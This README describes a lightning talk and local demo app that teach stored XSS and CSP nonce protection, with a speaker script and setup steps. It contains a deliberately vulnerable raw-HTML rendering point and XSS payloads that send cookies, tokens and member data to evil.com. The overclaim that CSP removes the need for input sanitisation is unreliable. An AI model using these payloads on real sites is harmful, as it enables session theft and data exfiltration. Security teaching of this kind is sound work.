# Security Engineering with AI: XSS & CSP Lightning Talk

A complete 5-7 minute lightning talk demonstrating Cross-Site Scripting (XSS) vulnerabilities and how Content Security Policy (CSP) with nonce provides robust protection.

## 🎯 Talk Overview

This presentation demonstrates:
1. **The Threat**: How XSS attacks work and their impact
2. **Live Demo**: A vulnerable web application showing XSS exploitation
3. **The Solution**: CSP nonce implementation that completely blocks the attack
4. **AI Integration**: How AI tools accelerated the security implementation

## 📁 Project Structure

```
├── slides/          # Spectacle presentation
├── app/             # Demo web application
├── docker-compose.yml
└── README.md
```

## 🚀 Quick Start

### Prerequisites
- Docker and Docker Compose
- Node.js 18+ (for local development)

### 1. Start the Demo Application

```bash
# Start the entire stack (database + app)
docker-compose up -d

# Or run locally (requires PostgreSQL)
cd app
npm install
npm start
```

The demo app will be available at:
- **Member Portal** (attacker submits request): http://localhost:3000/
- **Ten Maid Portal** (XSS executes): http://localhost:3000/maid
- **Secure Ten Maid Portal** (CSP protected): http://localhost:3000/secure

### 2. Start the Presentation

```bash
cd slides
npm install
npm start
```

The presentation will open at http://localhost:3001

## 🎤 Lightning Talk Script (5-7 minutes)

### Slide 1: Hook - The Hidden Danger (30 seconds)
*"Your website has visitors. [PAUSE] Some are not welcome."*

*"Every day, millions of websites welcome uninvited guests who slip in through one of the web's most persistent vulnerabilities."*

### Slide 2: XSS Revealed (45 seconds)
*"Cross-Site Scripting - or XSS."* [Big reveal]

*"It's simple but devastating: attackers inject their own malicious code into websites you trust. Your browser can't tell the difference between legitimate code and malicious code - so it executes everything."*

### Slide 3: Complete Compromise (1 minute)
*"When XSS succeeds, it's complete compromise."* [Dramatic pause]

*"Steal your session cookies - they become you on the site. Read all your private data right off the screen. Impersonate you to perform actions you never intended."*

*"This isn't just theory - this happens every day."*

### Slide 4: Demo Transition (15 seconds)
*"Let me show you."* [Click to demo]

### Live Demo (2 minutes)

**Two-Stage Attack Demo:**

**Stage 1 - Member Portal**: http://localhost:3000/
*"This is Ten Lifestyle's member portal where clients submit dining requests. Let me show you normal usage first."*

*[Fill out normal request: Phone number, Email contact, 2 guests, 7:30 PM, 5 Sep]*
*[Special occasion: "Anniversary dinner"]*
*[Dietary requirements: "Vegetarian options preferred"]*
*[Submit - explain this goes to staff for processing]*

**The Attack - Malicious Member:**
*"But what if a malicious member submits this in their dietary requirements?"*

## 🎯 Demo XSS Payloads

Copy these payloads from the `payloads/` directory and paste them into the dietary requirements field on the member portal (http://localhost:3000):

### 1. Simple Alert Demo (`payloads/simple-alert.js`):
```javascript
<script>alert('🚨 XSS ATTACK! Ten Maid system compromised - attacker has access to: ' + document.cookie);</script>
```

### 2. Cookie Theft (`payloads/1-cookie-theft.js`):
```javascript
<script>fetch('https://evil.com/steal?cookies='+document.cookie);</script>
```

### 3. Session Hijacking (`payloads/2-session-hijacking.js`):
```javascript
<script>window.location='https://evil.com/admin?token='+localStorage.getItem('authToken');</script>
```

### 4. Data Exfiltration (`payloads/3-data-exfiltration.js`):
```javascript
<script>fetch('/api/members').then(r=>r.json()).then(d=>fetch('https://evil.com/data',{method:'POST',body:JSON.stringify(d)}));</script>
```

### 5. **Dramatic Hacker Takeover** (`payloads/4-hacker-takeover.js`):
*For maximum impact during your lightning talk - this creates an immediate hostile takeover showing exactly what attackers steal. Copy the full script from the file.*

**Recommended for Demo:** Use `payloads/4-hacker-takeover.js` for your lightning talk as it provides the most visual impact with realistic attack simulation.

## 🗃️ Database Inspection (Optional Demo Enhancement)

To show your audience how the XSS payload is stored in the database, you can connect to PostgreSQL and inspect the data:

### Connect to the Database:
```bash
# Connect to the running PostgreSQL container
docker exec -it security-ai-csp-headers-lightning-talk-postgres-1 psql -U postgres -d xss_demo

# Or if containers aren't running, start a temporary connection:
docker run --rm -it --network security-ai-csp-headers-lightning-talk_default postgres:15-alpine psql -h postgres -U postgres -d xss_demo
```

### View All Member Requests:
```sql
-- See all stored requests
SELECT id, client_name, email, additional_details, created_at 
FROM olr_requests 
ORDER BY created_at DESC;
```

### View Just the Malicious Payload:
```sql
-- Show only the XSS payload in the dietary requirements
SELECT client_name, 
       LEFT(additional_details, 50) || '...' as payload_preview,
       LENGTH(additional_details) as payload_length,
       created_at
FROM olr_requests 
WHERE additional_details LIKE '%<script>%'
ORDER BY created_at DESC;
```

### See the Full Malicious Script:
```sql
-- View the complete XSS payload
SELECT additional_details 
FROM olr_requests 
WHERE additional_details LIKE '%<script>%'
ORDER BY created_at DESC 
LIMIT 1;
```

### Database Schema:
```sql
-- Show the table structure
\d olr_requests;

-- Exit PostgreSQL
\q
```

This demonstrates to your audience that the malicious JavaScript is stored as innocent-looking "dietary requirements" data, making it clear how attackers can weaponize user input fields.

*[Submit the malicious request]*

*"The attack is now planted. The malicious code sits waiting in our database, looking like an innocent dietary requirement."*

**Stage 2 - Ten Maid Portal**: http://localhost:3000/maid
*"Now let's see what happens when Ten Maid lifestyle managers process this request."*

*[Switch to Ten Maid portal - show Sarah Mitchell, Lifestyle Manager]*
*[Point to the pending requests, statistics, professional interface]*

*"Sarah opens the request to process the booking. She sees what looks like a normal dietary requirement, but..."*

*[Click on the request card - XSS executes]*

**The Impact:**
*"There it is! The attack executed in Sarah's browser with an immediate hostile takeover showing exactly what the attacker has stolen. This XSS attack demonstrates:"*
- *"Stealing Sarah's admin session cookies and authentication tokens"*
- *"Complete access to the member database with 15,847 profiles"*
- *"Unlocked access to payment systems and credit card vault"*
- *"Installation of persistent backdoors for continued access"*
- *"Ability to impersonate any Ten Maid staff member"*

*"Sarah thinks she's just processing a normal booking, but the attacker now has total control over Ten Maid's systems with the ability to execute fraudulent transactions, steal member data, and maintain permanent access."*

### Slide 5: The Hero - CSP (1 minute)
*"Meet your shield: Content Security Policy."*

*"Browser-level protection. Only approved scripts can run."*

### Slide 6: The Nonce (1 minute)
*"The nonce - 'number used once'. A unique secret for every page load."*

*[Point to the code example]*

*"Every legitimate script gets the secret. Malicious scripts don't."*

### Slide 7: The Victory (45 seconds)
*"Same attack, different result."*

**Switch to Secure Version**: http://localhost:3000/secure

*[Try the same XSS payload - it should be blocked]*

*"Attack neutralized. The browser blocks it automatically."*

### Slide 8: AI Integration (30 seconds)
*"This entire Ten Lifestyle demo - the vulnerable OLR system, the CSP-protected version, even this presentation - all built with AI assistance."*

*"AI doesn't just write code; it accelerates secure development practices across the entire stack."*

### Slide 9: Call to Action (30 seconds)
*"Implement CSP today. Generate nonces, set headers, use AI to accelerate."*

*"Questions?"*

### ⏱️ Timing Breakdown (Total: 6.5 minutes)

| Slide | Content | Time | Cumulative |
|-------|---------|------|------------|
| 1 | Hook - Hidden Danger | 30s | 0:30 |
| 2 | XSS Revealed | 45s | 1:15 |
| 3 | Complete Compromise | 60s | 2:15 |
| 4 | Demo Transition | 15s | 2:30 |
| - | **Live Demo** | 120s | 4:30 |
| 5 | CSP Hero | 60s | 5:30 |
| 6 | The Nonce | 60s | 6:30 |
| 7 | Victory Demo | 45s | 7:15 |
| 8 | AI Integration | 30s | 7:45 |
| 9 | Call to Action | 30s | 8:15 |

**Target: 6-7 minutes** (allows buffer for Q&A)

## 🛡️ Technical Implementation

### Two-Stage Attack Flow

**Stage 1: Member Portal (`/`)**
- Clean member interface for submitting dining requests
- Malicious payload enters via "Dietary requirements" field
- No immediate execution - stored in database

**Stage 2: Ten Maid Portal (`/maid`)**
- Ten Maid lifestyle manager interface with pending member requests
- XSS executes when staff view the malicious request:
```javascript
${request.additional_details}  // Raw HTML injection point
```

### Attack Scenarios Demonstrated

**1. Cookie Theft:**
```javascript
<script>fetch('https://evil.com/steal?cookies='+document.cookie);</script>
```

**2. Session Hijacking:**
```javascript
<script>window.location='https://evil.com/admin?token='+localStorage.getItem('authToken');</script>
```

**3. Data Exfiltration:**
```javascript
<script>fetch('/api/members').then(r=>r.json()).then(d=>fetch('https://evil.com/data',{method:'POST',body:JSON.stringify(d)}));</script>
```

### CSP Nonce Protection  
The secure endpoint (`/secure`) implements:

1. **Nonce Generation**:
```javascript
const nonce = crypto.randomBytes(16).toString('base64');
```

2. **CSP Header**:
```javascript
res.setHeader('Content-Security-Policy', 
  `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none';`
);
```

3. **Trusted Scripts**:
```html
<script nonce="${nonce}">
  // Only scripts with correct nonce execute
</script>
```

### Realistic Business Impact

**Before Attack:**
- Sarah Mitchell processes dining requests normally
- Member data remains secure
- Internal systems protected

**After XSS Attack:**
- Attacker has Sarah's admin session cookies
- Full access to member database and financial systems
- Can process fraudulent bookings and steal member data
- Potential regulatory fines and loss of customer trust

### Key Security Benefits of CSP Nonce
- **Whitelist Approach**: Only explicitly trusted scripts execute
- **Unpredictable Nonces**: Generated fresh for each request
- **No Input Sanitization Required**: Browser-level protection
- **Defense in Depth**: Works alongside other security measures
- **Zero Trust**: Malicious scripts blocked regardless of how they're injected

## 🔧 Development

### Local Development (without Docker)

1. **Start PostgreSQL**:
```bash
# Using Docker
docker run --name postgres -e POSTGRES_PASSWORD=password -e POSTGRES_DB=xss_demo -p 5432:5432 -d postgres:15-alpine

# Or use local PostgreSQL installation
```

2. **Start the App**:
```bash
cd app
npm install
npm run dev  # Uses nodemon for auto-reload
```

3. **Start the Slides**:
```bash
cd slides  
npm install
npm start
```

### Customizing the Demo

- **Add Comments Programmatically**: Use the `/comment` endpoint
- **Clear Comments**: POST to `/clear` 
- **Modify Payloads**: Edit the demo payload suggestions in `server.js`
- **Update Slides**: Modify `slides/src/Presentation.js`

## 📝 Speaker Notes

### Presentation Tips
- **Embrace the Drama**: Use pauses and build suspense 
- **Let Slides Breathe**: Don't rush through the visual reveals
- **Practice Transitions**: Demo switching should be seamless
- **Use Your Voice**: Match the emotional tone of each slide
- **Engage with Emojis**: They're conversation starters, not decorations

### Demo Tips  
- **Practice the Flow**: Run through the demo multiple times
- **Have Backup Plans**: Screenshots in case of technical issues
- **Show Browser Console**: Demonstrate CSP violations in DevTools  
- **Time Your Reveals**: Let the `Appear` animations build anticipation

### Common Questions
- **"What about other XSS types?"** - This focuses on stored XSS; reflected and DOM-based have similar CSP protections
- **"Performance impact?"** - Minimal; nonce generation is fast, browsers cache CSP parsing
- **"Browser support?"** - Excellent modern browser support; graceful degradation for older browsers
- **"Other CSP directives?"** - This demo uses `script-src`; CSP supports images, styles, etc.

### Technical Depth Options
Depending on audience, you can:
- **Beginner**: Focus on concepts and demo
- **Intermediate**: Show CSP headers in DevTools
- **Advanced**: Discuss CSP bypasses and `strict-dynamic`

## 🌟 Extensions

Ideas for expanding this demo:
- **DOM XSS Examples**: Show `innerHTML` vulnerabilities
- **CSP Reporting**: Add `report-uri` for violation monitoring  
- **Bypass Attempts**: Demonstrate why nonce is better than unsafe-inline
- **Framework Integration**: Show CSP nonce in React/Vue applications

## 🤝 Contributing

This project demonstrates security concepts for educational purposes. Feel free to:
- Improve the presentation content
- Add additional XSS examples  
- Enhance the UI/UX of the demo app
- Add more comprehensive CSP implementations

## ⚠️ Security Notice

**This application intentionally contains security vulnerabilities for educational purposes.**

- The vulnerable endpoint should only be used in controlled environments
- Do not deploy the vulnerable version to production
- Use this only for authorized security training and demonstrations

---

**Generated with AI assistance to demonstrate Security Engineering with AI practices** 🤖